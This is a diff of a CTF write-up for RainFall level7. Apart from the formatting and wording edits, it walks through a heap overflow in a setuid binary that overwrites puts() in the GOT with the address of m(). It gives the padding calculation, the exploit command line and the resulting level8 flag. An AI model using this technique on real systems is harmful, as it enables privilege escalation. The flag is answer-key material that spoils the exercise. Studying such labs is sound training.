@@ -1,12 +1,10 @@
-<p align="justify">
-
-level7 protections:
+Level7 protections:
 ```Shell
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
 ```
 
-level7 rights:
+Level7 rights:
 ```Shell
 -rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
 ```
@@ -43,7 +41,7 @@ Since we want to store `puts()` at the second index of the second array, we must
 - overflow arg1
 - reach the second array
 - reach the second index of the second array.
-We must subtract 0x0804a028(array2) - 0x0804a018(arg1) = 16. This is equal to overwrite enough to reach the start of the second array. But what we want is reaching the second index, so let's add 4 (half of 8-byte), making it a total of 20 bytes of padding.
+We must subtract 0x0804a028(array2) - 0x0804a018(arg1) = 16. This would overwrite enough to reach the start of the second array. But what we want is reaching the second index, so let's add 4 (half of 8-byte), making it a total of 20 bytes of padding.
 
 Next, let's find where `puts()` is located in GOT:
 ```Shell
@@ -56,7 +54,7 @@ Next, let's find where `puts()` is located in GOT:
 0x08048400 <+0>:     jmp    *0x8049928
 [...]
 ```
-The jump is done to the address of `puts()`, which converted to Little Endian is: `\x28\x99\x04\x08`. So this is where we want to store the address of `m()`.
+The jump is done to the address of `puts()`, which converted to little endian is: `\x28\x99\x04\x08`. So this is where we want to store the address of `m()`.
 
 Let's find what it is:
 ```Shell
@@ -75,4 +73,3 @@ level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') 
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1721403522
 ```
-</p>
